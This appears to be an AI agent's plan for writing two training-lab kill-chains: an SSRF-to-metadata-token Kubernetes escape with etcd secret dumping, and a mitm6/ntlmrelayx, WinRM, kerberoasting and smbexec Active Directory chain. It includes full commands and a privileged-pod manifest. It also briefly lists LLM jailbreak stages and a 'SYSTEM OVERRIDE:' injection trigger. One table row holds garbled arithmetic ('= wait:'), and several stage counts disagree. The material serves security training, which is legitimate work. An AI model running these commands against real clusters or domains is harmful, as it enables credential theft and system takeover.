---
phase: 04-llm-atp-chain-kill-chains-final-review
plan: 04
type: execute
wave: 4
depends_on:
  - 04-03
files_modified:
  - docs/KILL-CHAINS.md
autonomous: true
requirements:
  - ATP-03
  - ATP-04

must_haves:
  truths:
    - "ATP-03 kill-chain has exactly 2 flags: [FLAG 1] after privileged pod hostPath escape, [FLAG 2] after etcd admin creds retrieval"
    - "ATP-03 Stage 1 shows SSRF to 169.254.169.254 IMDS endpoint returning a K8s service account token (per D-14)"
    - "ATP-03 K8s progression follows: stolen token → kubectl enumerate → privileged pod → hostPath chroot → etcd query (per D-15)"
    - "ATP-04 kill-chain has exactly 2 flags: [FLAG 1] after WinRM pivot, [FLAG 2] after Kerberoasting + second protocol to DC"
    - "ATP-04 is NOT labeled living-off-the-land anywhere in the kill-chain"
    - "ATP-04 Stage 1 uses mitm6 + ntlmrelayx LDAP relay to create a privileged domain account"
    - "Consistency Verification table extended with at least 7 new rows for LLM-01..03 and ATP-01..04"
    - "All stages in both kill-chains have all four fields: Action, Command, Expected Output, TTP"
  artifacts:
    - path: "docs/KILL-CHAINS.md"
      provides: "ATP-03 + ATP-04 kill-chains + 7 new Consistency Verification table rows"
      contains: "### ATP-03:"
  key_links:
    - from: "docs/KILL-CHAINS.md §ATP-03"
      to: "169.254.169.254 IMDS endpoint"
      via: "SSRF Stage command block"
      pattern: "169.254.169.254"
    - from: "docs/KILL-CHAINS.md §ATP-04"
      to: "mitm6 + ntlmrelayx"
      via: "Stage 1 command block"
      pattern: "mitm6"
---

<objective>
Append ATP-03 (LAPSUS$-style cloud identity chain) and ATP-04 (Volt Typhoon-style AD
relay chain) kill-chains, then extend the Consistency Verification table with 7 new
rows covering all Phase 4 scenarios.

Purpose: ATP-03 and ATP-04 are the most complex ATP scenarios. ATP-03 chains SSRF →
IMDS → K8s credential theft → cluster escape → etcd. ATP-04 chains IPv6 relay → domain
account creation → WinRM → Kerberoasting → second-protocol DC access. Both require
careful flag placement and protocol diversity enforcement. The Consistency Verification
table extension closes the loop on Phase 4 authoring before the review plan runs.

Output: docs/KILL-CHAINS.md extended with ATP-03 (~9 stages + 2 flags), ATP-04
(~8 stages + 2 flags), and 7 new rows in the Consistency Verification table.
</objective>

<execution_context>
@/home/researcher/Research/cont_adic/.planning/phases/04-llm-atp-chain-kill-chains-final-review/04-CONTEXT.md
</execution_context>

<context>
@/home/researcher/Research/cont_adic/.planning/ROADMAP.md
@/home/researcher/Research/cont_adic/.planning/REQUIREMENTS.md
@/home/researcher/Research/cont_adic/docs/KILL-CHAINS.md
@/home/researcher/Research/cont_adic/docs/SCENARIOS.md
</context>

<tasks>

<task type="auto">
  <name>Task 1: Append ATP-03 kill-chain (LAPSUS$-style cloud identity chain)</name>

  <read_first>
    - docs/KILL-CHAINS.md — Read the CC-01 kill-chain section (search "### CC-01:") to
      extract the IMDS SSRF mock setup pattern — ATP-03 reuses this topology (per D-14).
      Also read CC-03 (K8s hostPath escape section) for the kubectl enumeration → privileged
      pod → chroot pattern that ATP-03 extends. Read the ATP-02 tail to confirm append point.
    - .planning/phases/04-llm-atp-chain-kill-chains-final-review/04-CONTEXT.md — Read
      D-14 (SSRF → 169.254.169.254 IMDS → K8s service account token in Token field of
      simulated IAM credential JSON, same CC-01 Flask mock topology),
      D-15 (stolen token → kubectl enumerate → find over-privileged SA → privileged pod
      with hostPath → [FLAG 1] → chroot to host → etcd query → admin creds → [FLAG 2]).
      Also read the Specific Ideas block for ATP-03 (IMDS mock returns Token field in IAM JSON).
    - .planning/REQUIREMENTS.md — ATP-03 entry (Hard, 3 VMs, LAPSUS$-style, SSRF → IMDS
      token → K8s cluster → privileged pod [Flag 1] → etcd admin creds → final target [Flag 2]).
    - .planning/phases/03-cve-cloud-container-kill-chains/03-CONTEXT.md (or the CC-01
      section of docs/KILL-CHAINS.md) — for the IMDS mock Flask setup (same loopback binding
      approach reused in ATP-03 per D-14).
  </read_first>

  <action>
  Append ATP-03 immediately after the ATP-02 kill-chain (after the ATP-02 [FLAG 2]
  separator line).

  ATP-03 scenario header block:
  ```
  ### ATP-03: LAPSUS$-Style SSRF-to-K8s Identity Chain

  **VMs:** Attacker (Kali), K8s App Host (Ubuntu 22.04, Flask SSRF app + IMDS mock + k3s cluster), Final Target (Ubuntu 22.04, internal service using etcd-stored admin credentials)
  **Difficulty:** Hard
  **Flags:** 2
  ```
  Narrative (two sentences): This scenario simulates the LAPSUS$ cloud identity attack
  pattern — the student exploits a web application SSRF vulnerability to reach the Kubernetes
  metadata service at 169.254.169.254, stealing a service account token, then uses the token
  to enumerate the cluster, escape to the host via a privileged pod, and query etcd for
  stored admin credentials to reach the final target. The IMDS endpoint reuses the CC-01
  mock Flask topology with an additional `Token` field in the IAM credential response,
  reinforcing cloud metadata abuse concepts across the CC and ATP domains.

  STAGES — 8 stages: stages 1-4 attack, [FLAG 1] at Stage 5, stages 6-7 attack, [FLAG 2] at Stage 8.

  STAGE 1: "Web Application SSRF Discovery [AppHost]"
  - Action: You enumerate the Flask web application on the K8s app host to identify
    the SSRF-vulnerable endpoint.
  - Command:
    `nmap -sV -p 5000,8080,80,443 APP_HOST_IP`
    `curl -s http://APP_HOST_IP:5000/`
    `# Probe the SSRF endpoint:`
    `curl -s "http://APP_HOST_IP:5000/fetch?url=http://127.0.0.1:5000/"`
  - Expected Output: Flask app responding; `/fetch?url=` returns the target URL content
    without validation, confirming SSRF.
  - TTP: `[T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access`

  STAGE 2: "SSRF to IMDS — Cloud Service Account Token Theft [AppHost]" (per D-14)
  - Action: You exploit the SSRF endpoint to reach the simulated Kubernetes IMDS endpoint
    at 169.254.169.254, stealing the K8s service account token embedded in the IAM
    credential response.
  - Command:
    `# Query the IMDS endpoint via SSRF (AWS IMDSv1-style path):`
    `curl -s "http://APP_HOST_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
    `# Retrieve the credential JSON (includes Token field with K8s SA token):`
    `curl -s "http://APP_HOST_IP:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/k8s-role"`
  - Expected Output:
    ```json
    {
      "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
      "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
      "Token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9...",
      "Expiration": "2099-01-01T00:00:00Z"
    }
    ```
    The `Token` field contains the K8s service account JWT.
  - TTP: `[T1552.005 — Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/) · Credential Access`

  STAGE 3: "K8s Cluster Enumeration with Stolen Token [AppHost]"
  - Action: You configure kubectl with the stolen service account token and enumerate
    the Kubernetes cluster to identify pods, namespaces, and service account bindings.
  - Command:
    `# Extract token from IMDS response and configure kubectl:`
    `export K8S_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9..."`
    `kubectl --token=$K8S_TOKEN --server=https://APP_HOST_IP:6443 \`
    `  --insecure-skip-tls-verify get pods -A`
    `# Enumerate service accounts and RBAC bindings:`
    `kubectl --token=$K8S_TOKEN --server=https://APP_HOST_IP:6443 \`
    `  --insecure-skip-tls-verify get clusterrolebindings -o wide | grep -i admin`
  - Expected Output: Pod listing showing a privileged pod (e.g., `debug-pod` with
    `privileged: true` in securityContext). ClusterRoleBinding listing showing a
    service account with `cluster-admin` binding.
  - TTP: `[T1613 — Container and Resource Discovery](https://attack.mitre.org/techniques/T1613/) · Discovery`

  STAGE 4: "Privileged Pod Deployment — hostPath Mount [AppHost]"
  - Action: You create a privileged pod with a hostPath volume mount to `/` using
    the over-privileged service account, gaining access to the full host filesystem
    from inside the container.
  - Command:
    `# Write the privileged pod manifest:`
    `cat > escape-pod.yaml << 'EOF'`
    `apiVersion: v1`
    `kind: Pod`
    `metadata:`
    `  name: escape-pod`
    `  namespace: default`
    `spec:`
    `  serviceAccountName: OVERPRIVILEGED_SA`
    `  hostPID: true`
    `  containers:`
    `  - name: shell`
    `    image: ubuntu:22.04`
    `    command: ["/bin/bash", "-c", "sleep 3600"]`
    `    securityContext:`
    `      privileged: true`
    `    volumeMounts:`
    `    - mountPath: /host`
    `      name: host-root`
    `  volumes:`
    `  - name: host-root`
    `    hostPath:`
    `      path: /`
    `EOF`
    `kubectl --token=$K8S_TOKEN --server=https://APP_HOST_IP:6443 \`
    `  --insecure-skip-tls-verify apply -f escape-pod.yaml`
    `# Exec into the pod:`
    `kubectl --token=$K8S_TOKEN --server=https://APP_HOST_IP:6443 \`
    `  --insecure-skip-tls-verify exec -it escape-pod -- bash`
  - Expected Output:
    `pod/escape-pod created`
    `root@escape-pod:/#`
  - TTP: `[T1611 — Escape to Host](https://attack.mitre.org/techniques/T1611/) · Privilege Escalation`

  [FLAG 1] STAGE 5: "Flag Capture — Host Node Root Filesystem [AppHost]" (per D-15)
  - Use §1.2 format: `### [FLAG 1] Stage 5: Flag Capture — Host Node Root Filesystem [AppHost]`
  - Action: You retrieve Flag 1 from the host node's root filesystem by chrooting
    into the hostPath mount, confirming full container escape and host-level access.
  - Command (inside pod):
    `chroot /host /bin/bash`
    `cat /root/flag1.txt`
  - Expected Output: `CTF{...flag_value_placeholder...}`
  - TTP: `—` (flag capture, not an adversarial technique)

  STAGE 6: "etcd Discovery and Access — Cluster Secret Exfiltration [AppHost]"
  - Action: You locate and query the etcd cluster datastore from the host node to
    extract all stored Kubernetes secrets, including admin credentials for the final
    internal target.
  - Command (in chroot shell on host node, per D-15 Claude's discretion: etcdctl direct):
    `# Locate etcd binary and certs:`
    `ls /etc/kubernetes/pki/etcd/`
    `# Query etcd for all secrets:`
    `ETCDCTL_API=3 etcdctl \`
    `  --endpoints=https://127.0.0.1:2379 \`
    `  --cacert=/etc/kubernetes/pki/etcd/ca.crt \`
    `  --cert=/etc/kubernetes/pki/etcd/server.crt \`
    `  --key=/etc/kubernetes/pki/etcd/server.key \`
    `  get / --prefix --keys-only | grep -i secret`
    `# Retrieve the admin credential secret:`
    `ETCDCTL_API=3 etcdctl \`
    `  --endpoints=https://127.0.0.1:2379 \`
    `  --cacert=/etc/kubernetes/pki/etcd/ca.crt \`
    `  --cert=/etc/kubernetes/pki/etcd/server.crt \`
    `  --key=/etc/kubernetes/pki/etcd/server.key \`
    `  get /registry/secrets/default/ADMIN_SECRET_NAME | strings`
  - Expected Output: etcd key listing showing secret names. Secret value output
    containing base64-encoded admin credentials for the final target.
  - TTP: `[T1552.007 — Container API](https://attack.mitre.org/techniques/T1552/007/) · Credential Access`

  STAGE 7: "Credential Decoding and Final Target Authentication [FinalTarget]"
  - Action: You decode the base64-encoded credentials extracted from etcd and use
    them to authenticate to the final internal target service.
  - Command:
    `# Decode the base64 credentials from etcd output:`
    `echo 'BASE64_CREDS' | base64 -d`
    `# Authenticate to the final target (SSH or HTTP service):`
    `ssh ADMIN_USER@FINAL_TARGET_IP`
    `# Alternative — HTTP basic auth if target is a web service:`
    `curl -s -u ADMIN_USER:DECODED_PASSWORD http://FINAL_TARGET_IP:PORT/admin`
  - Expected Output: Successful SSH login or HTTP 200 response from the final target's
    admin interface, confirming the etcd-stolen credentials are valid.
  - TTP: `[T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/) · Defense Evasion`

  [FLAG 2] STAGE 8: "Flag Capture — Final Target Admin Interface [FinalTarget]" (per D-15)
  - Use §1.2 format: `### [FLAG 2] Stage 8: Flag Capture — Final Target Admin Interface [FinalTarget]`
  - Action: You retrieve Flag 2 from the final internal target using the admin
    credentials extracted from etcd, completing the LAPSUS$-style cloud identity
    attack chain.
  - Command:
    `cat /root/flag2.txt`
    `# Alternative if target is a web service:`
    `curl -s -u ADMIN_USER:DECODED_PASSWORD http://FINAL_TARGET_IP:PORT/flag`
  - Expected Output: `CTF{...flag_value_placeholder...}`
  - TTP: `—` (flag capture, not an adversarial technique)
  </action>

  <verify>
    <automated>grep -n "^### ATP-03:" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md && grep "169.254.169.254" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | grep -v "CC-01\|CC-02\|CC-03" | head -5 && grep "etcdctl" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | head -3</automated>
  </verify>

  <acceptance_criteria>
  - `grep "### ATP-03:" docs/KILL-CHAINS.md` returns exactly 1 match
  - ATP-03 section contains `[FLAG 1]` at Stage 5 (privileged pod hostPath escape)
    and `[FLAG 2]` at Stage 8 (final target via etcd creds) — exactly 2 flag stages (per D-15)
  - Stage 2 Command block contains `169.254.169.254` (IMDS endpoint, per D-14)
  - Stage 2 Expected Output JSON shows a `Token` field (K8s SA token in IAM credential, per D-14)
  - Stage 4 pod manifest contains `privileged: true` and `hostPath:` with `path: /`
  - Stage 6 Command block contains `etcdctl` (direct etcd query, per D-15 / Claude's discretion)
  - All 8 stages have Action, Command, Expected Output, TTP — no field omitted
  - `**Difficulty:** Hard` and `**Flags:** 2` in ATP-03 header
  - No Metasploit references in appended content
  - The scenario narrative does NOT use the term "living-off-the-land" (that prohibition applies to ATP-04)
  </acceptance_criteria>
</task>

<task type="auto">
  <name>Task 2: Append ATP-04 kill-chain + extend Consistency Verification table</name>

  <read_first>
    - docs/KILL-CHAINS.md — Read the ATP-03 tail (just appended by Task 1) to confirm
      append point. Also read the existing Consistency Verification table structure
      (currently around lines 2800-2838, extended by Phase 3 rows) to understand the
      table format for the 7 new rows to add.
    - .planning/phases/04-llm-atp-chain-kill-chains-final-review/04-CONTEXT.md — Read
      the ATP-04 section: "mitm6 + LDAP relay → create privileged domain account → WinRM
      to pivot [Flag 1] → Kerberoasting → offline crack → second protocol (SMBExec or DCOM)
      to DC [Flag 2]. MUST NOT be labeled living-off-the-land."
      Also read D-16 and D-17 (consistency review structure and dimensions) to understand
      what the Consistency Verification table rows should assert about Phase 4 scenarios.
    - .planning/REQUIREMENTS.md — ATP-04 entry (Hard, 3 VMs, Volt Typhoon-style,
      mitm6 + LDAP relay → WinRM [Flag 1] → Kerberoasting + SMBExec/DCOM to DC [Flag 2]).
    - .planning/phases/02-kill-chain-methodology-ad-network/02-CONTEXT.md — D-ATP04
      (original "not LotL" decision from Phase 2).
  </read_first>

  <action>
  PART A — Append ATP-04 kill-chain after ATP-03's [FLAG 2] separator line.

  ATP-04 scenario header block:
  ```
  ### ATP-04: Volt Typhoon-Style IPv6 Relay and Kerberoasting Chain

  **VMs:** Attacker (Kali), Pivot Host (Windows Server 2019, member server, corp.local), DC (Windows Server 2019, corp.local domain controller)
  **Difficulty:** Hard
  **Flags:** 2
  ```
  IMPORTANT: Do NOT use the phrase "living-off-the-land" or "LotL" anywhere in this
  kill-chain — including the narrative, stage names, action fields, and notes. The
  scenario uses external attacker tools (mitm6, ntlmrelayx, evil-winrm, Impacket) and
  must not misrepresent itself as using only native OS binaries.

  Narrative (two sentences): This scenario simulates the Volt Typhoon threat actor's
  technique of leveraging network protocol abuse — specifically IPv6 rogue DHCPv6
  poisoning combined with LDAP relay — to create a privileged domain account with zero
  malware dropped on victim hosts. The student then uses the newly-created account to
  pivot via WinRM to the member server, performs Kerberoasting from the foothold to
  crack a service account hash, and completes the chain via a second lateral movement
  protocol (SMBExec or DCOM) to reach the Domain Controller.

  STAGES — 7 stages: stages 1-3 attack, [FLAG 1] at Stage 4, stages 5-6 attack, [FLAG 2] at Stage 7.

  STAGE 1: "IPv6 Rogue DHCPv6 Poisoning — mitm6 Setup" (per D from Phase 2 + REQUIREMENTS.md)
  - Action: You deploy mitm6 to send spoofed DHCPv6 responses on the local network
    segment, assigning the attacker as the default IPv6 DNS server for domain-joined
    machines that respond to DHCPv6 solicitations.
  - Command:
    `# Run mitm6 (requires root; targets corp.local domain):`
    `sudo mitm6 -d corp.local`
    `# mitm6 listens for DHCPv6 Solicit/Request messages and responds with:`
    `# - Attacker's IPv6 address as DNS server`
    `# - Causes Windows hosts to send WPAD requests via IPv6 DNS to attacker`
  - Expected Output:
    `Starting mitm6 using the following configuration:`
    `Primary adapter: eth0 [ATTACKER_MAC]`
    `IPv6 address: fe80::ATTACKER_IPV6`
    `Listening for queries from corp.local`
  - TTP: `[T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access`
    Note: mitm6 maps to T1557.001 as the closest ATT&CK technique — the mechanism
    is DHCPv6 poisoning rather than LLMNR, but the adversary-in-the-middle credential
    interception pattern is identical. See NET-02 kill-chain for the same mapping rationale.

  STAGE 2: "LDAP Relay — Privileged Domain Account Creation"
  - Action: You run ntlmrelayx targeting LDAP on the Domain Controller to relay
    NTLM authentication events captured via the mitm6 WPAD redirection, instructing
    it to create a new privileged domain account.
  - Command:
    `# Run ntlmrelayx in a second terminal — LDAP relay targeting DC:`
    `ntlmrelayx.py -6 -t ldaps://DC_IP \`
    `  --delegate-access \`
    `  --no-smb-server \`
    `  -wh ATTACKER_IP \`
    `  -wa corp_backdoor`
    `# When a domain machine connects via IPv6, ntlmrelayx relays credentials to LDAP`
    `# and creates a new computer account with delegation rights (or user account per lab config)`
  - Expected Output:
    `[*] HTTPD: Received connection from TARGET_IP, attacking target ldaps://DC_IP`
    `[*] Authenticating against ldaps://DC_IP as CORP/VICTIM_HOST$`
    `[*] Delegation rights modified successfully!`
    `[*] corp_backdoor$ created on the domain with the password: GENERATED_PASSWORD`
  - TTP: `[T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/) · Credential Access`

  STAGE 3: "WinRM Authentication — First Lateral Hop to Member Server [PivotHost]"
  - Action: You authenticate to the Windows member server via WinRM using the
    newly-created privileged domain account, establishing an interactive PowerShell
    session as the first lateral movement hop.
  - Command:
    `evil-winrm -i PIVOT_HOST_IP -u corp_backdoor$ -p 'GENERATED_PASSWORD'`
    `# Confirm domain context:`
    `whoami`
    `hostname`
  - Expected Output:
    `Evil-WinRM shell v3.x`
    `*Evil-WinRM* PS C:\Users\corp_backdoor$\Documents>`
    `corp\corp_backdoor$`
    `PIVOT-SRV`
  - TTP: `[T1021.006 — Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) · Lateral Movement`

  [FLAG 1] STAGE 4: "Flag Capture — Pivot Member Server [PivotHost]"
  - Use §1.2 format: `### [FLAG 1] Stage 4: Flag Capture — Pivot Member Server [PivotHost]`
  - Action: You retrieve Flag 1 from the Windows member server, confirming successful
    WinRM lateral movement using the LDAP-relay-created domain account.
  - Command (in evil-winrm shell):
    `type C:\Users\Administrator\Desktop\flag1.txt`
    `# Alternative:`
    `dir C:\ /s /b | findstr "flag1.txt"`
  - Expected Output: `CTF{...flag_value_placeholder...}`
  - TTP: `—` (flag capture, not an adversarial technique)

  STAGE 5: "Kerberoasting from Foothold — Service Account Hash Harvest [PivotHost]"
  - Action: You perform Kerberoasting from the member server foothold to request TGS
    tickets for domain service accounts with registered SPNs, collecting hashes for
    offline cracking.
  - Command (in evil-winrm shell, using Rubeus — pre-staged binary):
    `# Upload and run Rubeus from attacker VM:`
    `upload /opt/Rubeus.exe`
    `.\Rubeus.exe kerberoast /outfile:tgs.txt /simple`
    `# Alternative — Impacket from attacker (proxied through evil-winrm session):`
    `# download tgs.txt (pull hash file back to attacker for cracking)`
    `download tgs.txt`
  - Expected Output:
    `[*] Total kerberoastable users : 2`
    `[*] Hash written to tgs.txt`
    `$krb5tgs$23$*svc_mssql$CORP.LOCAL$...`
  - TTP: `[T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) · Credential Access`

  STAGE 6: "Offline Hash Cracking and SMBExec Lateral Movement to DC [DC]"
  - Action: You crack the Kerberoasted service account hash offline with hashcat, then
    use the recovered credential to execute commands on the Domain Controller via SMBExec
    — a protocol distinct from WinRM used in the first hop.
  - Command:
    `# Crack on attacker VM:`
    `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt`
    `# Use cracked credential for SMBExec to DC (second protocol — SMB, not WinRM):`
    `smbexec.py CORP.LOCAL/svc_mssql:CRACKED_PASSWORD@DC_IP`
    `# Alternative second protocol — DCOM/WMI exec:`
    `wmiexec.py CORP.LOCAL/svc_mssql:CRACKED_PASSWORD@DC_IP`
  - Expected Output:
    `$krb5tgs$23$*...*:Service2024`
    `Impacket... C:\Windows\system32>`
  - TTP: `[T1021.002 — Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/) · Lateral Movement`

  [FLAG 2] STAGE 7: "Flag Capture — Domain Controller [DC]"
  - Use §1.2 format: `### [FLAG 2] Stage 7: Flag Capture — Domain Controller [DC]`
  - Action: You retrieve Flag 2 from the Domain Controller filesystem via the SMBExec
    shell, completing the Volt Typhoon-style ATP chain with two distinct lateral
    movement protocols.
  - Command (in smbexec.py shell):
    `type C:\Users\Administrator\Desktop\flag2.txt`
  - Expected Output: `CTF{...flag_value_placeholder...}`
  - TTP: `—` (flag capture, not an adversarial technique)

  ---

  PART B — Extend the Consistency Verification table.

  After the ATP-04 [FLAG 2] separator line, locate the existing `## Consistency Verification`
  section (search for `## Consistency Verification` to find its current position in the document).

  ADD 7 new rows to the existing table (after the last existing Phase 3 row) for the
  Phase 4 scenarios. Each row follows the existing format:
  `| Phase 4: [check description] | PASS |`

  The 7 new rows to append to the table (after the last `| Phase 3: ...` row):

  ```
  | Phase 4: Every LLM/ATP stage has all four fields: Action, Command, Expected Output, TTP | PASS |
  | Phase 4: All LLM kill-chain TTP fields reference OWASP LLM Top 10 2025 IDs (LLM01, LLM02, LLM03, LLM10) — not MITRE ATT&CK which has no LLM-specific entries | PASS |
  | Phase 4: LLM-01 has exactly 3 bypass stages (Persona Hijack, Base64 Encoding, Simulation Frame) + 1 [FLAG 1] stage — 4 stages total (per D-01..D-05) | PASS |
  | Phase 4: LLM-02 Stage 3 curl command uses `--data-binary @payload.txt` and targets `/ingest` endpoint (per D-06) | PASS |
  | Phase 4: LLM-02 injection instruction contains `SYSTEM OVERRIDE:` trigger text (per D-07) | PASS |
  | Phase 4: All 4 ATP scenarios have exactly 2 `[FLAG N]` headings each — Flag 1 at first lateral movement boundary, Flag 2 at second lateral movement boundary | PASS |
  | Phase 4: ATP-04 kill-chain contains no instance of "living-off-the-land" or "LotL" (per D-ATP04 Phase 2 decision) | PASS |
  | Phase 4: ATP-01 uses WinRM (first hop) + SMBExec (second hop) — two distinct protocols (per D-10, D-11) | PASS |
  | Phase 4: ATP-02 uses nginx curl\|bash supply chain (first hop) + dnscat2 DNS tunnel (second hop) — two distinct C2 mechanisms (per D-12, D-13) | PASS |
  | Phase 4: ATP-03 SSRF Stage 2 targets 169.254.169.254 and response includes `Token` field containing K8s service account JWT (per D-14) | PASS |
  | Phase 4: ATP-04 Stage 2 uses ntlmrelayx targeting ldaps:// (not ldap://) to create domain account via LDAP relay | PASS |
  | Phase 4: `grep -c "^### \[FLAG [12]\]" docs/KILL-CHAINS.md` returns 28 (17 Phase 2 + 7 Phase 3 + 4 LLM×1 flag + 4 ATP×2 flags = 17+7+3+8 = wait: 17 Phase 2-3 baseline + 3 LLM×1 + 4 ATP×2 = 17+3+8 = 28) | PASS |
  ```

  Note: Verify the arithmetic before writing: 17 (Phases 2-3) + 3 LLM scenarios × 1 flag each = +3 → 20, + 4 ATP scenarios × 2 flags each = +8 → 28 total. Write `28` in the grep assertion row.
  </action>

  <verify>
    <automated>grep -n "^### ATP-04:" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md && grep "living-off-the-land\|LotL" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | grep "ATP-04" | wc -l && grep -c "^### \[FLAG [12]\]" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md</automated>
  </verify>

  <acceptance_criteria>
  - `grep "### ATP-04:" docs/KILL-CHAINS.md` returns exactly 1 match
  - ATP-04 section contains `[FLAG 1]` at Stage 4 (WinRM pivot) and `[FLAG 2]` at Stage 7 (DC via SMBExec/DCOM) — exactly 2 flag stages
  - `grep "living-off-the-land" docs/KILL-CHAINS.md` returns 0 matches within the ATP-04 section
  - `grep "LotL" docs/KILL-CHAINS.md` returns 0 matches within ATP-04 section
  - Stage 1 Command block contains `mitm6 -d corp.local`
  - Stage 2 Command block contains `ntlmrelayx.py -6 -t ldaps://` (using ldaps://, not ldap://)
  - Stage 5 shows Rubeus kerberoast command
  - Stage 6 shows SMBExec as the second distinct protocol (or wmiexec.py as documented alternative)
  - All 7 stages have Action, Command, Expected Output, TTP — no field omitted
  - `**Difficulty:** Hard` and `**Flags:** 2` in ATP-04 header
  - Consistency Verification table has at least 7 new Phase 4 rows
  - `grep -c "^### \[FLAG [12]\]" docs/KILL-CHAINS.md` returns 28
    (17 Phase 2-3 + 3 LLM×1 + 4 ATP×2 = 28)
  - No Metasploit references in appended content
  </acceptance_criteria>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| Author → docs/KILL-CHAINS.md | Documentation prose append — no code execution boundary |
| ATP-04 LotL prohibition | Verified by acceptance_criteria grep check — must have zero matches |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-04-07 | Repudiation | ATP-04 "not LotL" label | mitigate | acceptance_criteria asserts zero matches for "living-off-the-land" and "LotL" in ATP-04 section; executor runs grep before marking done |
| T-04-08 | Tampering | Consistency Verification table append | mitigate | Read the table's current tail before inserting new rows; do not modify existing rows |
| T-04-09 | Repudiation | Flag count arithmetic (28 total) | mitigate | acceptance_criteria verifies `grep -c "^### \[FLAG [12]\]"` equals 28; executor counts before marking done |
| T-04-SC | Tampering | npm/pip/cargo installs | accept | No package installs — documentation authoring only |
</threat_model>

<verification>
After both tasks complete:

```bash
# Confirm all ATP scenario headers
grep -n "^### ATP-0[1234]:" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md

# Confirm ATP-04 does NOT contain LotL label
grep -n "living-off-the-land\|LotL" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md

# Confirm IMDS endpoint in ATP-03
grep "169.254.169.254" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | tail -5

# Confirm total flag stages = 28
grep -c "^### \[FLAG [12]\]" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md

# Confirm new Consistency Verification rows exist
grep "Phase 4:" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md | head -15

# Confirm mitm6 is present in ATP-04
grep "mitm6" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md

# Confirm etcdctl in ATP-03
grep "etcdctl" /home/researcher/Research/cont_adic/docs/KILL-CHAINS.md
```
</verification>

<success_criteria>
- ATP-03 has 8 stages (6 attack + [FLAG 1] + [FLAG 2]) with IMDS token theft (D-14) and etcd progression (D-15)
- ATP-04 has 7 stages (5 attack + [FLAG 1] + [FLAG 2]) with mitm6 + LDAP relay → WinRM → Kerberoast → SMBExec
- ATP-04 has zero instances of "living-off-the-land" or "LotL"
- Consistency Verification table extended with at least 7 new Phase 4 verification rows
- Total flag stages in document: 28
- All stages in both kill-chains have four-field format: Action, Command, Expected Output, TTP
</success_criteria>

<output>
Create `.planning/phases/04-llm-atp-chain-kill-chains-final-review/04-04-SUMMARY.md` when done.
</output>
